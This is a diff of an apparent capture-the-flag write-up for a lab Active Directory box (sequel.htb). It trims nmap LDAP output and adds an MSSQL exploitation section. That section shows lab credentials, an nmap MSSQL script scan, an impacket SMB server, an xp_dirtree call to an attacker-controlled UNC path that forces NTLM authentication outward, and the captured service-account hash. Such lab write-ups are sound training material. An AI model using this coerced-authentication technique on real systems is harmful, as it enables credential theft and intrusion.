@@ -135,85 +135,7 @@ PORT     STATE SERVICE       VERSION
 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
 | ldap-rootdse: 
 | LDAP Results
-|   <ROOT>
-|       domainFunctionality: 7
-|       forestFunctionality: 7
-|       domainControllerFunctionality: 7
-|       rootDomainNamingContext: DC=sequel,DC=htb
-|       ldapServiceName: sequel.htb:dc$@SEQUEL.HTB
-|       isGlobalCatalogReady: TRUE
-|       supportedSASLMechanisms: GSSAPI
-|       supportedSASLMechanisms: GSS-SPNEGO
-|       supportedSASLMechanisms: EXTERNAL
-|       supportedSASLMechanisms: DIGEST-MD5
-|       supportedLDAPVersion: 3
-|       supportedLDAPVersion: 2
-|       supportedLDAPPolicies: MaxPoolThreads
-|       supportedLDAPPolicies: MaxPercentDirSyncRequests
-|       supportedLDAPPolicies: MaxDatagramRecv
-|       supportedLDAPPolicies: MaxReceiveBuffer
-|       supportedLDAPPolicies: InitRecvTimeout
-|       supportedLDAPPolicies: MaxConnections
-|       supportedLDAPPolicies: MaxConnIdleTime
-|       supportedLDAPPolicies: MaxPageSize
-|       supportedLDAPPolicies: MaxBatchReturnMessages
-|       supportedLDAPPolicies: MaxQueryDuration
-|       supportedLDAPPolicies: MaxDirSyncDuration
-|       supportedLDAPPolicies: MaxTempTableSize
-|       supportedLDAPPolicies: MaxResultSetSize
-|       supportedLDAPPolicies: MinResultSets
-|       supportedLDAPPolicies: MaxResultSetsPerConn
-|       supportedLDAPPolicies: MaxNotificationPerConn
-|       supportedLDAPPolicies: MaxValRange
-|       supportedLDAPPolicies: MaxValRangeTransitive
-|       supportedLDAPPolicies: ThreadMemoryLimit
-|       supportedLDAPPolicies: SystemMemoryLimitPercent
-|       supportedControl: 1.2.840.113556.1.4.319
-|       supportedControl: 1.2.840.113556.1.4.801
-|       supportedControl: 1.2.840.113556.1.4.473
-|       supportedControl: 1.2.840.113556.1.4.528
-|       supportedControl: 1.2.840.113556.1.4.417
-|       supportedControl: 1.2.840.113556.1.4.619
-|       supportedControl: 1.2.840.113556.1.4.841
-|       supportedControl: 1.2.840.113556.1.4.529
-|       supportedControl: 1.2.840.113556.1.4.805
-|       supportedControl: 1.2.840.113556.1.4.521
-|       supportedControl: 1.2.840.113556.1.4.970
-|       supportedControl: 1.2.840.113556.1.4.1338
-|       supportedControl: 1.2.840.113556.1.4.474
-|       supportedControl: 1.2.840.113556.1.4.1339
-|       supportedControl: 1.2.840.113556.1.4.1340
-|       supportedControl: 1.2.840.113556.1.4.1413
-|       supportedControl: 2.16.840.1.113730.3.4.9
-|       supportedControl: 2.16.840.1.113730.3.4.10
-|       supportedControl: 1.2.840.113556.1.4.1504
-|       supportedControl: 1.2.840.113556.1.4.1852
-|       supportedControl: 1.2.840.113556.1.4.802
-|       supportedControl: 1.2.840.113556.1.4.1907
-|       supportedControl: 1.2.840.113556.1.4.1948
-|       supportedControl: 1.2.840.113556.1.4.1974
-|       supportedControl: 1.2.840.113556.1.4.1341
-|       supportedControl: 1.2.840.113556.1.4.2026
-|       supportedControl: 1.2.840.113556.1.4.2064
-|       supportedControl: 1.2.840.113556.1.4.2065
-|       supportedControl: 1.2.840.113556.1.4.2066
-|       supportedControl: 1.2.840.113556.1.4.2090
-|       supportedControl: 1.2.840.113556.1.4.2205
-|       supportedControl: 1.2.840.113556.1.4.2204
-|       supportedControl: 1.2.840.113556.1.4.2206
-|       supportedControl: 1.2.840.113556.1.4.2211
-|       supportedControl: 1.2.840.113556.1.4.2239
-|       supportedControl: 1.2.840.113556.1.4.2255
-|       supportedControl: 1.2.840.113556.1.4.2256
-|       supportedControl: 1.2.840.113556.1.4.2309
-|       supportedControl: 1.2.840.113556.1.4.2330
-|       supportedControl: 1.2.840.113556.1.4.2354
-|       supportedCapabilities: 1.2.840.113556.1.4.800
-|       supportedCapabilities: 1.2.840.113556.1.4.1670
-|       supportedCapabilities: 1.2.840.113556.1.4.1791
-|       supportedCapabilities: 1.2.840.113556.1.4.1935
-|       supportedCapabilities: 1.2.840.113556.1.4.2080
-|       supportedCapabilities: 1.2.840.113556.1.4.2237
+----CUT HERE TO SAVE SPACE----
 |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sequel,DC=htb
 |       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb
 |       schemaNamingContext: CN=Schema,CN=Configuration,DC=sequel,DC=htb
@@ -233,102 +155,6 @@ PORT     STATE SERVICE       VERSION
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
-| ldap-rootdse: 
-| LDAP Results
-|   <ROOT>
-|       domainFunctionality: 7
-|       forestFunctionality: 7
-|       domainControllerFunctionality: 7
-|       rootDomainNamingContext: DC=sequel,DC=htb
-|       ldapServiceName: sequel.htb:dc$@SEQUEL.HTB
-|       isGlobalCatalogReady: TRUE
-|       supportedSASLMechanisms: GSSAPI
-|       supportedSASLMechanisms: GSS-SPNEGO
-|       supportedSASLMechanisms: EXTERNAL
-|       supportedSASLMechanisms: DIGEST-MD5
-|       supportedLDAPVersion: 3
-|       supportedLDAPVersion: 2
-|       supportedLDAPPolicies: MaxPoolThreads
-|       supportedLDAPPolicies: MaxPercentDirSyncRequests
-|       supportedLDAPPolicies: MaxDatagramRecv
-|       supportedLDAPPolicies: MaxReceiveBuffer
-|       supportedLDAPPolicies: InitRecvTimeout
-|       supportedLDAPPolicies: MaxConnections
-|       supportedLDAPPolicies: MaxConnIdleTime
-|       supportedLDAPPolicies: MaxPageSize
-|       supportedLDAPPolicies: MaxBatchReturnMessages
-|       supportedLDAPPolicies: MaxQueryDuration
-|       supportedLDAPPolicies: MaxDirSyncDuration
-|       supportedLDAPPolicies: MaxTempTableSize
-|       supportedLDAPPolicies: MaxResultSetSize
-|       supportedLDAPPolicies: MinResultSets
-|       supportedLDAPPolicies: MaxResultSetsPerConn
-|       supportedLDAPPolicies: MaxNotificationPerConn
-|       supportedLDAPPolicies: MaxValRange
-|       supportedLDAPPolicies: MaxValRangeTransitive
-|       supportedLDAPPolicies: ThreadMemoryLimit
-|       supportedLDAPPolicies: SystemMemoryLimitPercent
-|       supportedControl: 1.2.840.113556.1.4.319
-|       supportedControl: 1.2.840.113556.1.4.801
-|       supportedControl: 1.2.840.113556.1.4.473
-|       supportedControl: 1.2.840.113556.1.4.528
-|       supportedControl: 1.2.840.113556.1.4.417
-|       supportedControl: 1.2.840.113556.1.4.619
-|       supportedControl: 1.2.840.113556.1.4.841
-|       supportedControl: 1.2.840.113556.1.4.529
-|       supportedControl: 1.2.840.113556.1.4.805
-|       supportedControl: 1.2.840.113556.1.4.521
-|       supportedControl: 1.2.840.113556.1.4.970
-|       supportedControl: 1.2.840.113556.1.4.1338
-|       supportedControl: 1.2.840.113556.1.4.474
-|       supportedControl: 1.2.840.113556.1.4.1339
-|       supportedControl: 1.2.840.113556.1.4.1340
-|       supportedControl: 1.2.840.113556.1.4.1413
-|       supportedControl: 2.16.840.1.113730.3.4.9
-|       supportedControl: 2.16.840.1.113730.3.4.10
-|       supportedControl: 1.2.840.113556.1.4.1504
-|       supportedControl: 1.2.840.113556.1.4.1852
-|       supportedControl: 1.2.840.113556.1.4.802
-|       supportedControl: 1.2.840.113556.1.4.1907
-|       supportedControl: 1.2.840.113556.1.4.1948
-|       supportedControl: 1.2.840.113556.1.4.1974
-|       supportedControl: 1.2.840.113556.1.4.1341
-|       supportedControl: 1.2.840.113556.1.4.2026
-|       supportedControl: 1.2.840.113556.1.4.2064
-|       supportedControl: 1.2.840.113556.1.4.2065
-|       supportedControl: 1.2.840.113556.1.4.2066
-|       supportedControl: 1.2.840.113556.1.4.2090
-|       supportedControl: 1.2.840.113556.1.4.2205
-|       supportedControl: 1.2.840.113556.1.4.2204
-|       supportedControl: 1.2.840.113556.1.4.2206
-|       supportedControl: 1.2.840.113556.1.4.2211
-|       supportedControl: 1.2.840.113556.1.4.2239
-|       supportedControl: 1.2.840.113556.1.4.2255
-|       supportedControl: 1.2.840.113556.1.4.2256
-|       supportedControl: 1.2.840.113556.1.4.2309
-|       supportedControl: 1.2.840.113556.1.4.2330
-|       supportedControl: 1.2.840.113556.1.4.2354
-|       supportedCapabilities: 1.2.840.113556.1.4.800
-|       supportedCapabilities: 1.2.840.113556.1.4.1670
-|       supportedCapabilities: 1.2.840.113556.1.4.1791
-|       supportedCapabilities: 1.2.840.113556.1.4.1935
-|       supportedCapabilities: 1.2.840.113556.1.4.2080
-|       supportedCapabilities: 1.2.840.113556.1.4.2237
-|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sequel,DC=htb
-|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb
-|       schemaNamingContext: CN=Schema,CN=Configuration,DC=sequel,DC=htb
-|       namingContexts: DC=sequel,DC=htb
-|       namingContexts: CN=Configuration,DC=sequel,DC=htb
-|       namingContexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
-|       namingContexts: DC=DomainDnsZones,DC=sequel,DC=htb
-|       namingContexts: DC=ForestDnsZones,DC=sequel,DC=htb
-|       isSynchronized: TRUE
-|       highestCommittedUSN: 168070
-|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb
-|       dnsHostName: dc.sequel.htb
-|       defaultNamingContext: DC=sequel,DC=htb
-|       currentTime: 20230427124241.0Z
-|_      configurationNamingContext: CN=Configuration,DC=sequel,DC=htb
 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
@@ -410,7 +236,19 @@ firefox SQL\ Server\ Procedures.pdf
 
 It looks like we need to enumerate MSSQL now.
 
-### Port 1433 (MS-SQL)
+#### First set of credentials found:
+
+```
+PublicUser:GuestUserCantWrite1
+```
+
+### Port 1433 (MSSQL)
+
+#### Attempted Automatic Nmap MSSQL Enumeration
+
+```
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.202.159 -Pn
+```
 
 #### Impacket-mssqlclient
 
@@ -423,9 +261,46 @@ password: GuestUserCantWrite1
 
 Attempted to enable xp\_cmdshell, but it did not work.
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
+
+### Capturing NTLM Hash via MSSQL Relay Attack
+
+Begin SMB Server:
+
+```
+sudo impacket-smbserver ./ -smb2support
+```
+
+Authenticate to MSSQL server with newly obtained credentials:
+
+```
+impacket-mssqlclient PublicUser@sequel.htb
+password: GuestUserCantWrite1
+```
+
+Trigger NTLM Relay Attack:
+
+```
+xp_dirtree '\\10.10.14.23\any\thing'
+```
+
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+#### Sequel User NTLM Hash
+
+{% code overflow="wrap" %}
+```
+sql_svc::sequel:aaaaaaaaaaaaaaaa:7772050ee5ee1f89fc33c64c1d1272ef:01010000000000008051705cd579d901069a53da1cbddf9f00000000010010004d0077006b004100510071006f004400030010004d0077006b004100510071006f004400020010004f007500420077005700430056005800040010004f007500420077005700430056005800070008008051705cd579d901060004000200000008003000300000000000000000000000003000003d52eb97775a1999339f81b907194ef13041aa9cdcb498705ec7a93bf279f7190a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000
+```
+{% endcode %}
+
+This method was taken from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)!
+
+<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+
+
 
 ### Name of the technique
 
